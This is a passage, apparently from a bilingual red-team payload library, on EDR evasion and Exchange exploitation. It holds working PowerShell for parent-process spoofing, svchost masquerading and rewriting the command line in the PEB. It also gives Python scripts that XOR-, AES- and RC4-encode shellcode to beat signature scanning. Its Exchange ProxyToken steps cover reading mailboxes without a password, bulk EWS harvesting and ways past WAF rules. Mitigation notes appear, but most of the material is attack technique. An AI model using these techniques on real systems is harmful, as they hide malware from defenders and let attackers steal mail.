C:\Windows\Temp\ppid.txt',[IntPtr]::Zero,[IntPtr]::Zero,$false,0x00080000,[IntPtr]::Zero,$null,$ss,[ref]$pi);Start-Sleep -Milliseconds 500;$gp=(Get-CimInstance Win32_Process -Filter ("ProcessId="+$pi.pid)).ParentProcessId;'child='+$pi.pid+' ppid='+$gp+' (expected explorer '+(Get-Process explorer)[0].Id+')'

description.zh: 以 InitializeProcThreadAttributeList+UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS=0x00020000) 组成完整属性列表并绑定 explorer 句柄，STARTUPINFOEX 内嵌属性列表后经 CreateProcess(EXTENDED_STARTUPINFO_PRESENT) 启动子进程把 whoami 结果落盘，一次跑通 PPID 伪装全链。判据：C:\Windows\Temp\ppid.txt 生成且回显 child 的 ppid 等于 explorer PID，Sysmon E1 的 ParentImage 为 explorer.exe。
description.en: Builds the full attribute list with UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) bound to the explorer handle, embeds it in STARTUPINFOEX and launches the child via CreateProcess with EXTENDED_STARTUPINFO_PRESENT, so the whole PPID-spoof chain runs in one shot. Success: C:\Windows\Temp\ppid.txt created, the echoed child ppid equals the explorer PID, and Sysmon E1 shows ParentImage=explorer.exe.

explanation.zh: 写入 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS(0x00020000) 并绑定 explorer 句柄
explanation.en: Writes PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (0x00020000) bound to the explorer handle

explanation.zh: 把属性列表挂进 STARTUPINFOEX（cb=104，AttributeList 位于偏移 96）
explanation.en: Attaches the attribute list into STARTUPINFOEX (cb=104, list pointer at offset 96)

explanation.zh: 子进程把 whoami 结果落盘，作为伪装链执行的落点证据
explanation.en: Child writes whoami output to disk as the landing evidence of the spoofed chain

explanation.zh: EXTENDED_STARTUPINFO_PRESENT，启用 STARTUPINFOEX 扩展结构
explanation.en: EXTENDED_STARTUPINFO_PRESENT flag enables the STARTUPINFOEX structure

description.zh: PowerShell PPID 欺骗：托管 API System.Diagnostics.ProcessStartInfo 没有 ParentProcessId 属性，不能直接赋值；真实实现路径是先 InitializeProcThreadAttributeList/UpdateProcThreadAttribute 在 STARTUPINFOEX 上设置 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS，再以 EXTENDED_STARTUPINFO_PRESENT 调用 CreateProcess。；成功时新创建的 cmd.exe 父进程显示为 explorer。
description.en: PowerShell PPID spoofing: the managed System.Diagnostics.ProcessStartInfo has no ParentProcessId property and cannot be assigned; the real implementation sets PROC_THREAD_ATTRIBUTE_PARENT_PROCESS on a STARTUPINFOEX via InitializeProcThreadAttributeList and UpdateProcThreadAttribute, then calls CreateProcess with EXTENDED_STARTUPINFO_PRESENT.; the newly created cmd.exe showing explorer as its parent process confirms success.

title.en: Parent-Process Attribute and Telemetry Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_PPID_SPOOF_E_2 与蓝队日志；成功时结构定义片段用于代码审计对照，无独立执行效果。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_PPID_SPOOF_E_2 with blue-team logs; the structure-definition snippet serving as an audit reference with no standalone effect confirms usage.

name.zh: 进程映像与命令行一致性审计
name.en: Process Image and Command-Line Consistency Audit

description.zh: 验证进程映像改写与命令行伪装的遥测一致性检测。
description.en: Runs a masqueraded process that copies a system process name from a user-writable directory and verifies that the executable-path-versus-name inconsistency remains the stable detection signal across telemetry sources.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

overview.zh: 进程映像与命令行一致性审计覆盖进程伪装检测场景：针对依赖映像路径与命令行关联的检测逻辑，验证映像与名称不一致的进程能否被稳定识别。验证维度涵盖 spawnto/ppid 配置核对、映像复制伪装执行与 Win32_Process 多源字段比对三类。
overview.en: Process Image and Command-Line Consistency Audit covers process masquerading detection: for detection logic relying on image-path and command-line correlation, verify whether processes with image/name mismatches are reliably identified. Verification dimensions cover spawnto/ppid configuration checks, image-copy masquerade execution, and Win32_Process multi-source field comparison.

vulnerability.zh: 根因是进程名可复制而映像路径不可伪造，仅按进程名或父进程判断的检测即被绕过；伪装进程在用户可写目录运行时，ExecutablePath 与其声称的系统进程名必然不一致，构成稳定检测信号。
vulnerability.en: The root cause is that process names are copyable while image paths are not, so detection judging only by process name or parent is bypassed; a masquerading process running from a user-writable directory necessarily mismatches ExecutablePath against its claimed system process name — a stable detection signal.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 spawnto 与 ppid 配置指定派生进程映像与父进程，配置生效即确认起点；第 2 步复制 cmd.exe 为临时目录下的 svchost.exe 并隐藏窗口执行，Get-Process 显示其 Path 指向临时目录即确认伪装成立；第 3 步用 Win32_Process 输出 PID/父 PID/路径/命令行清单，比对映像路径与命令行不一致项完成检测验证。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 sets the derived process image and parent with spawnto and ppid — effective configuration marks the starting point; step 2 copies cmd.exe as svchost.exe in a temp directory and runs it hidden — Get-Process showing Path in the temp directory confirms the masquerade; step 3 lists PID/parent PID/path/command line with Win32_Process and compares image-path versus command-line mismatches to complete detection validation. Replace LAB_* placeholders via the global variables menu.

mitigation.en: Validate by image path, signature, and parent chain rather than process name; alert on system process names appearing from user-writable directories; enable Sysmon event 1 with full command lines. After the fix, regress with the step 2 sample: the masquerading process must trigger an image-mismatch alert.

title.en: Configure spawning as a legit binary

description.zh: 用 spawnto x64 指定 svchost.exe 作为派生进程映像并锁定父进程 PID；后续注入动作均以常见系统进程形态出现。
description.en: Set spawnto x64 to svchost.exe with a pinned parent PID; later injections all wear the shape of a familiar system process.

description.zh: 把 cmd.exe 复制改名为 svchost.exe 隐藏窗口启动；进程名列表显示 svchost 即完成目视层伪装。
description.en: Copy cmd.exe as svchost.exe and start it hidden; the process list showing svchost completes the visual masquerade.

attackChain.payload:
Copy-Item C:\Windows\System32\cmd.exe "$env:TEMP\svchost.exe"
Start-Process "$env:TEMP\svchost.exe" -ArgumentList "/c whoami" -WindowStyle Hidden
Start-Sleep -Seconds 1
Get-Process -Name svchost | Select-Object Id,ProcessName,Path

title.zh: 校验进程元数据一致性

description.zh: 用 Get-CimInstance Win32_Process 核对可执行路径与命令行；路径落在 TEMP 而非 System32 即需配合父进程伪装补齐上下文。
description.en: Check ExecutablePath and CommandLine with Get-CimInstance; a TEMP path instead of System32 needs parent-process spoofing to complete the disguise.

title.zh: PEB 参数覆写规避变体

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("ntdll.dll")]public static extern int NtQueryInformationProcess(IntPtr h,int c,byte[] bi,int l,out int rl);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$bi=New-Object byte[] 48;$rl=0;[void][W.M]::NtQueryInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle,0,$bi,48,[ref]$rl);$peb=[BitConverter]::ToInt64($bi,8);$pp=[Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]$peb,0x20);$fake='C:\Windows\System32\notepad.exe -masqueraded';[Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]$pp,0x70,$fake.Length*2);[Runtime.InteropServices.Marshal]::WriteInt16([IntPtr]$pp,0x72,$fake.Length*2+2);$buf=[Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]$pp,0x78);[Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::Unicode.GetBytes($fake),0,$buf,$fake.Length*2);'wmi-cmdline-now='+(Get-CimInstance Win32_Process -Filter ("ProcessId=$PID")).CommandLine

description.zh: 绕过跨进程镜像一致性校验：NtQueryInformationProcess 取 PEB 基址，覆写 ProcessParameters+0x70 的 CommandLine UNICODE_STRING（Length 0x70、MaximumLength 0x72、Buffer 0x78，x64 偏移），遥测读到伪装值。成功判据：命令尾 Get-CimInstance 返回的 CommandLine 为伪装的 notepad.exe 形态。
description.en: Rewrites the CommandLine UNICODE_STRING inside the PEB (x64 offsets 0x70/0x72/0x78) after resolving it via NtQueryInformationProcess, so telemetry reads a masqueraded notepad.exe value. Success: the trailing Get-CimInstance shows the masqueraded command line.

explanation.zh: 取 PBI，偏移 8 为 PEB 基址
explanation.en: Fetch the PBI; offset 8 holds the PEB base

explanation.zh: 覆写 CommandLine.Buffer（0x78）内容为伪装形态
explanation.en: Overwrite the CommandLine.Buffer (0x78) contents with the masqueraded form

name.zh: 编码内存载荷检测回归

description.zh: 提交异或/AES 编码的内存载荷样本，对比 EDR 静态与行为检测的回归表现。
description.en: Submits XOR/AES-encoded payloads into memory and compares static signature, entropy-threshold, and behavioral detections, mapping which missing detection dimension forms the encoding bypass window.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

overview.zh: 编码内存载荷检测回归覆盖载荷编码与静态检测对抗场景：针对静态特征扫描机制，验证 XOR 与 RC4 编码对检出率的影响。验证维度涵盖编码器脚本调用、XOR 循环参考实现、RC4 加密实现与不可执行夹具哈希基线四类步骤。
overview.en: Encoded In-Memory Payload Detection Regression covers payload encoding versus static detection: against signature-based scanning, verify how XOR and RC4 encoding affect detection rates. Verification dimensions cover encoder script invocation, an XOR-loop reference implementation, RC4 encryption, and a hash baseline over a non-executable byte fixture.

vulnerability.zh: 根因是静态检测依赖明文字节特征与熵值阈值，XOR/RC4 编码使载荷不再命中已知签名；高熵本身并不必然判恶，检测需要同时覆盖熵、导入表与内存行为，任一维度缺失即形成编码绕过窗口。
vulnerability.en: The root cause is that static detection depends on plaintext byte signatures and entropy thresholds, and XOR/RC4 encoding stops payloads matching known signatures; high entropy alone is not proof of malice, so detection must jointly cover entropy, import tables, and memory behavior — any missing dimension opens an encoding bypass window.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 shellcode_encoder.py 对夹具文件编码，输出文件可逆解码一致即确认工具链；第 2 步用 XOR 循环参考实现复现并比对输出一致；第 3 步用 PyCryptodome ARC4 复现 RC4 加密并比对参考密文；第 4 步对不可执行字节夹具计算 SHA256，作为非执行完整性基线。全程仅使用无执行语义的字节夹具；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 encodes the fixture file with shellcode_encoder.py — a reversible-decode match on the output confirms the toolchain; step 2 replays with the XOR-loop reference and matches output; step 3 replays RC4 with PyCryptodome ARC4 and matches the reference ciphertext; step 4 computes the SHA256 of the non-executable byte fixture as the integrity baseline. Use only byte fixtures with no execution semantics throughout; replace LAB_* placeholders via the global variables menu.

mitigation.en: Add multi-dimensional rules over entropy, import tables, and memory behavior, alert on encrypted payload drops and suspicious decode chains, and enable memory scanning to cover post-decode forms. After the fix, regress with the step 1-3 samples: encoded files must trigger entropy or behavior alerts.

title.zh: 编码 shellcode 摆脱签名
title.en: Encode shellcode off the signature list

description.zh: 用 shellcode_encoder.py 以随机密钥加工原始 shellcode；产物哈希改变且功能可还原即脱离静态特征库。
description.en: Process the shellcode with shellcode_encoder.py under a random key; a changed hash with recoverable function escapes static signatures.

title.zh: 异或轮转密钥落地实现

description.zh: 按 key[i % len] 对字节流逐位异或；加载器内嵌同一密钥在内存还原后跳转执行即运行时等价。
description.en: XOR each byte with key[i % len]; the loader embedding the same key restores and jumps to it in memory, runtime-equivalent to the original.

description.en: Hash the encoded artifact with SHA256; matching the loader's built-in value guarantees correct decryption and execution after delivery.

title.zh: AES-CBC 加密变形规避变体

wafBypass.command:
python3 - <<'PY'
from Crypto.Cipher import AES
from os import urandom
key=urandom(32); iv=urandom(16)
sc=open('{LAB_SHELLCODE_FILE}','rb').read()
sc+=b'\x90'*((-len(sc))%16)
open('{LAB_ENCODED_FILE}','wb').write(iv+AES.new(key,AES.MODE_CBC,iv).encrypt(sc))
print(key.hex())
PY

description.zh: 绕过静态熵分析与 XOR 特征扫描：AES-CBC 加密使载荷熵呈随机分布。成功判据：{LAB_ENCODED_FILE} 熵接近 7.99 且解密后可执行。
description.en: Evades static entropy analysis and XOR signature scanning since AES-CBC ciphertext presents near-random entropy. Success: {LAB_ENCODED_FILE} entropy approaches 7.99 and decrypts to executable shellcode.

title.zh: 多轮滚动异或规避变体

wafBypass.command:
python3 - <<'PY'
sc=bytearray(open('{LAB_SHELLCODE_FILE}','rb').read())
keys=[b'k1!',b'k2@#',b'k3$%^']
for k in keys:
    for i in range(len(sc)): sc[i]^=k[i%len(k)]
open('{LAB_ENCODED_FILE}','wb').write(sc)
PY

description.zh: 三轮互质长度密钥（3/4/5 字节）滚动异或，等效周期 lcm=60 字节，显著抬高单字节/短周期已知明文恢复与特征匹配门槛；原三等长密钥等效周期仅 3 字节、与宣传强度相反，已纠正。判据：按逆序以同密钥组逐轮异或可还原原 shellcode 字节。
description.en: Three rolling keys of coprime lengths (3/4/5 bytes) give an equivalent period of lcm=60 bytes, sharply raising known-plaintext recovery and signature-matching cost; the previous equal-length keys collapsed to a 3-byte period, the opposite of the claimed strength, now fixed. Success: reverse-order XOR with the same key set restores the original shellcode bytes.

from Crypto.Cipher import ARC4
from hashlib import sha256
key=sha256(b'{LAB_RC4_SEED}').digest()
open('{LAB_ENCODED_FILE}','wb').write(ARC4.new(key).encrypt(open('{LAB_SHELLCODE_FILE}','rb').read()))
PY

description.zh: 绕过对固定密钥 RC4 流的特征还原：以种子派生密钥且每次不同。成功判据：派生密钥解密成功。
description.en: Evades signature recovery against fixed-key RC4 streams by deriving the key from a seed each run. Success: the derived key decrypts successfully.

name.zh: Exchange ProxyToken 授权回归

description.zh: 验证 ProxyToken 简化认证混淆的授权绕过与补丁回归。
description.en: Sends unauthenticated requests carrying the X-ClientApplication header into the proxy path and abuses the SecurityToken deserialization confusion to assume an existing session and read the target mailbox without a password.

subCategory.zh: 已知利用链与访问边界

overview.zh: Exchange ProxyToken 授权回归覆盖令牌反序列化与代理组合场景：针对未安装相关安全补丁的 Exchange 服务器，验证无认证用户能否借 X-ClientApplication 代理获得邮箱访问能力。验证维度涵盖 proxytoken 一键利用、附加模式操作与端点暴露核对三类。
overview.en: Exchange ProxyToken Authorization Regression covers token deserialization combined with proxying: for Exchange servers missing the relevant security patches, verify whether an unauthenticated user can gain mailbox access via the X-ClientApplication proxy. Verification dimensions cover one-shot proxytoken exploitation, append-mode operations, and endpoint exposure checks.

vulnerability.zh: 根因是 Exchange 前端允许未认证请求携带 X-ClientApplication 头进入代理路径，后端 SecurityToken 反序列化缺陷与代理身份混淆组合，使攻击者无需口令即可冒充已有会话读取目标邮箱。
vulnerability.en: The root cause is that the Exchange front end lets unauthenticated requests carrying the X-ClientApplication header enter proxy paths; the back-end SecurityToken deserialization flaw combined with proxy identity confusion lets an attacker impersonate an existing session and read the target mailbox without a password.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在授权实验环境运行 proxytoken.py，获得目标邮箱访问能力即确认利用成功；第 2 步用 -a 附加模式完成后续邮箱操作并输出结果；第 3 步用 curl 向 /ews/Exchange.asmx 携带 X-ClientApplication 头探测，返回可访问响应即确认端点暴露面。EXCHANGE_HOST 等占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 runs proxytoken.py in an authorized lab — mailbox access confirms exploitation; step 2 performs follow-up mailbox operations in append mode (-a) and reviews the output; step 3 probes /ews/Exchange.asmx with curl carrying the X-ClientApplication header — an accessible response confirms endpoint exposure. Replace EXCHANGE_HOST and other placeholders via the global variables menu.

mitigation.zh:
安装覆盖该缺陷的安全更新并升级至受支持 CU，收紧 EWS/Autodiscover 暴露，审计邮箱委派与异常 X-ClientApplication 请求：
    # Exchange 管理外壳：禁用遗留认证、审计 FullAccess 委派
    # 若无策略先建：New-AuthenticationPolicy -Name BlockLegacyAuth
    Set-OrganizationConfig -DefaultAuthenticationPolicy "BlockLegacyAuth"
    Get-Mailbox -ResultSize Unlimited | Get-MailboxPermission |
      Where-Object {$_.AccessRights -contains 'FullAccess' -and -not $_.IsInherited} |
      Export-Csv C:\Audit\delegate-audit.csv -NoTypeInformation
mitigation.en: Install the security update covering the flaw and upgrade to a supported CU, restrict EWS/Autodiscover exposure, audit anomalous mailbox permissions and session usage, and monitor requests with unusual X-ClientApplication values. After the fix, regress with the step 1 and step 3 samples: exploitation must fail and endpoint responses must be restricted.

description.zh: 运行 proxytoken.py 指定目标与邮箱探测；返回可达的 OWA 端点即目标 Exchange 未修复该授权缺陷。
description.en: Probe with proxytoken.py against target and mailbox; a reachable OWA endpoint returned means the Exchange lacks the ProxyToken fix.

description.zh: 加 -a 参数重放中转请求访问收件箱路径；响应携带目标收件箱邮件内容即无需任何凭据即可读取他人邮箱。
description.en: Replay the relayed request with -a; the victim's inbox contents returned mean reading mail without any credentials.

title.zh: 直调 EWS 批量收割

description.zh: 用 curl 携带 X-ClientApplication 头访问 /ews/Exchange.asmx；SOAP 查询成功即可脚本化批量导出邮件与附件。
description.en: Call /ews/Exchange.asmx with the X-ClientApplication header via curl; working SOAP queries enable scripted bulk export of mail and attachments.

description.zh: 绕过拦截 X-ClientApplication: Test 精确值的规则：ProxyToken 依赖 DelegatedAuth 对该头"非空即信任"，因此换成合法 Outlook UA 值、头名小写或复合值均触发同一信任分支；成功判据：请求未弹 Basic 认证（无 WWW-Authenticate: Basic）而直接进入 EWS 处理。
description.en: Bypasses rules blocking the exact X-ClientApplication: Test value: DelegatedAuth trusts any non-empty value, so a legitimate Outlook UA string, lowercase header name or composite value hits the same trust branch; success criterion: no Basic challenge (no WWW-Authenticate: Basic) and the request proceeds into EWS handling.

description.zh: 绕过对 /ews/Exchange.asmx 精确路径的检测与速率限制：大小写、尾斜杠、点段、%23 截断与查询串追加在 EWS 前端规范化后命中同一终结点；成功判据：所有变形返回同原始路径一致的响应码与服务器头（含 X-DiagInfo 指纹）。
description.en: Bypasses detection and rate limits on the exact /ews/Exchange.asmx path: case, trailing slash, dot segments, %23 truncation and appended query strings normalize to the same endpoint; success criterion: all variants return response codes and server headers (X-DiagInfo fingerprint) identical to the original path.

description.zh: 绕过对 "Authorization: Negotiate <token>" 固定模板的规则：scheme 与 token 间用制表符、头名小写、scheme 全大写及双 Authorization 头（取其一）等形态在 IIS/HttpListener 解析中等价；成功判据：变形请求仍以受害者身份通过 Negotiate 验证（响应含其邮箱上下文而非 401）。
description.en: Bypasses rules on the fixed "Authorization: Negotiate <token>" template: a tab between scheme and token, lowercase header name, uppercase scheme and duplicate Authorization headers (one honored) parse equivalently in IIS/HttpListener; success criterion: the variant still authenticates as the victim (mailbox context in response, not 401).

description.zh: 绕过仅对 GET/HTTP1.1 或无体请求建模的防护：HTTP/1.0 + POST + 内联 SOAP（ResolveNames/GetFolder）携带 DelegatedAuth 头组合直达 EWS 数据面；成功判据：返回 200 且 SOAP 响应包含目标邮箱解析/文件夹结果，证明代理认证链未拦截。
description.en: Bypasses defenses modeling only GET/HTTP1.1 or bodyless requests: HTTP/1.0 + POST + inline SOAP (ResolveNames/GetFolder) carries the DelegatedAuth header set straight to the EWS data plane; success criterion: 200 with SOAP results for the target mailbox, proving the proxy auth chain did not block it.
